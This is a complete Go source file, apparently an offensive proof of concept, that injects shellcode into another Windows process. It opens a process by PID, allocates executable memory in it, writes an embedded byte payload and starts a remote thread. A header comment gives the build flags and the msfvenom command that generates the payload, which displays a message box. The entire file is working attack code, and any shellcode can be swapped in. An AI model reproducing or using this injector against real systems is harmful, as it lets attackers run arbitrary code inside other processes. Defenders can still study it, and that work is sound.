/*
injector.go
Author: Fir3n0x
Compile with: go build -ldflags="-s -w" -o injector.exe injector.go
Description: Basic injector that injects shellcode into a target process.
payload: msfvenom -p windows/x64/messagebox TEXT='Process Injection successful' TITLE='PoC' -b '\x00' -f c
*/

package main

import (
    "fmt"
    "syscall"
    "unsafe"
)

var (
    kernel32              = syscall.NewLazyDLL("kernel32.dll")
    procOpenProcess       = kernel32.NewProc("OpenProcess")
    procVirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
    procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
    procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
    procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
    procCloseHandle       = kernel32.NewProc("CloseHandle")
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    INFINITE               = 0xFFFFFFFF
    PROCESS_ALL_ACCESS     = 0x1F0FFF
)

var payload = []byte{
    0x48,0x31,0xc9,0x48,0x81,0xe9,0xd8,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,
    0xff,0xff,0xff,0x48,0xbb,0x8f,0xd6,0x43,0x3e,0x74,0x3b,0x42,0xb0,0x48,
    0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x73,0x9e,0xc2,
    0xda,0x84,0xc4,0xbd,0x4f,0x67,0x1a,0x43,0x3e,0x74,0x7a,0x13,0xf1,0xdf,
    0x84,0x12,0x76,0x45,0xe9,0x14,0xd5,0xc7,0x5d,0x11,0x5e,0x3c,0xb0,0x10,
    0xa8,0xc7,0x5d,0x11,0x1e,0x3c,0x34,0xf5,0xfa,0xc5,0x9e,0xc8,0x4c,0x24,
    0x76,0x73,0x79,0xc7,0xe7,0x83,0x92,0x48,0x5a,0x3e,0xb2,0xa3,0xf6,0x02,
    0xff,0xbd,0x36,0x03,0xb1,0x4e,0x34,0xae,0x6c,0x3c,0xb0,0x10,0x90,0xce,
    0x87,0xc8,0x7c,0x48,0x73,0x43,0x60,0xe9,0x57,0x3b,0x26,0x7f,0x39,0x4d,
    0x35,0xfd,0xd6,0x43,0x3e,0xff,0xbb,0xca,0xb0,0x8f,0xd6,0x0b,0xbb,0xb4,
    0x4f,0x25,0xf8,0x8e,0x06,0xc8,0x76,0x6c,0x7f,0xc9,0xf0,0xaf,0x86,0x0a,
    0x3f,0xa4,0xd8,0x14,0xf8,0x70,0x1f,0x02,0xb5,0x40,0xb3,0x0a,0xb1,0x59,
    0x9b,0x72,0xf7,0x3c,0x0a,0x82,0x1c,0xce,0x17,0x8a,0x33,0x35,0x3a,0x83,
    0x88,0x6f,0xa3,0xb2,0x72,0x77,0x77,0x66,0xb8,0xca,0xef,0x92,0x4b,0xac,
    0x63,0x06,0x3b,0xcf,0xf2,0x0a,0x3f,0xa4,0x5d,0x03,0x3b,0x83,0x9e,0x07,
    0xb5,0x34,0x27,0x0b,0xb1,0x5f,0x97,0xc8,0x3a,0xfc,0x73,0x43,0x60,0xce,
    0x8e,0x02,0x66,0x2a,0x62,0x18,0xf1,0xd7,0x97,0x1a,0x7f,0x2e,0x73,0xc1,
    0x5c,0xaf,0x97,0x11,0xc1,0x94,0x63,0x03,0xe9,0xd5,0x9e,0xc8,0x2c,0x9d,
    0x70,0xbd,0x4f,0x70,0x8b,0xab,0x35,0x74,0x3b,0x42,0xc5,0xfc,0xb3,0x31,
    0x0d,0x46,0x15,0x26,0xdc,0xe3,0xd6,0x1a,0x7f,0xce,0x77,0x35,0x96,0x88,
    0x29,0x96,0x77,0xb3,0xfa,0x42,0xb0,0x8f,0xd6,0xab,0x23,0x74,0x3b,0x42,
    0xe0,0xfd,0xb9,0x20,0x5b,0x07,0x48,0x62,0xf9,0xe1,0xbc,0x26,0x5d,0x00,
    0x52,0x2d,0xde,0xaf,0xa5,0x36,0x5d,0x17,0x5e,0x31,0xc3,0xe9,0xa3,0x2f,
    0x3e,0x2e,0xd3,0x46,0xb0,0x8f,0xd6,0x13,0x51,0x37,0x3b,0x03,0xe8,0xc7,
    0xe7,0x8a,0x7f,0xce,0x7e,0xc1,0xe6,0x88,0x29,0x96,0x76,0x45,0xf2,0x03,
    0x0a,0x7f,0x63,0xe1,0x68,0x8b,0xee,0x42,0xb0,
}

func main() {
    var pid uint32
    fmt.Print("Enter PID: ")
    fmt.Scan(&pid)

    hProcess, _, err := procOpenProcess.Call(
        uintptr(PROCESS_ALL_ACCESS),
        uintptr(0),
        uintptr(pid),
    )
    if hProcess == 0 {
        fmt.Println("[-] Error OpenProcess:", err)
        return
    }
    fmt.Println("[+] OpenProcess successful")

    addr, _, err := procVirtualAllocEx.Call(
        hProcess,
        0,
        uintptr(len(payload)),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    if addr == 0 {
        fmt.Println("[-] Error VirtualAllocEx:", err)
        return
    }
    fmt.Println("[+] VirtualAllocEx successful")

    written, _, err := procWriteProcessMemory.Call(
        hProcess,
        addr,
        uintptr(unsafe.Pointer(&payload[0])),
        uintptr(len(payload)),
        0,
    )
    if written == 0 {
        fmt.Println("[-] Error WriteProcessMemory:", err)
        return
    }
    fmt.Println("[+] WriteProcessMemory successful")

    hThread, _, err := procCreateRemoteThread.Call(
        hProcess,
        0,
        0,
        addr,
        0,
        0,
        0,
    )
    if hThread == 0 {
        fmt.Println("[-] Error CreateRemoteThread:", err)
        return
    }
    fmt.Println("[+] CreateRemoteThread successful")

    fmt.Println("[*] Waiting for the remote thread to finish...")
    procWaitForSingleObject.Call(hThread, INFINITE)

    procCloseHandle.Call(hThread)
    procCloseHandle.Call(hProcess)
}
